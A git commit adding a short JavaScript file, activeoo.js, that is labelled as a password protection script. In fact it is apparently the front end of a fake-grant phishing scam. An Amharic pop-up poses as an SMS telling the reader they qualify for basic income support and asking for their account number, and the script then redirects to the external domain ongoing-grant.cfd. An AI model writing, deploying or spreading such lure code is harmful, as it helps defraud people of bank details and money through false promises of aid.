0515344e8f60a9de824f18167f40270b3ad81f1d
The-ongoing <preciousadaowo4@gmail.com>
2026-01-08 21:24:03 +0100

    Create activeoo.js

---
+++ activeoo.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ገንዘብ ያውጡ'
+password = prompt(
+  'SMS: እንኳን ደስ አለዎት! የተገደበ መሰረታዊ የገቢ ድጋፍ ለመቀበል ብቁ ሆነዋል። እባክዎ የመለያ ቁጥርዎን ለማስገባት OK ይጫኑ።.',
+  'ገንዘብ ያውጡ'
+);
+if (password != 'ገንዘብ ያውጡ') {
+  location.href = 'https://ongoing-grant.cfd/Fayadamtoota.html';
+  }
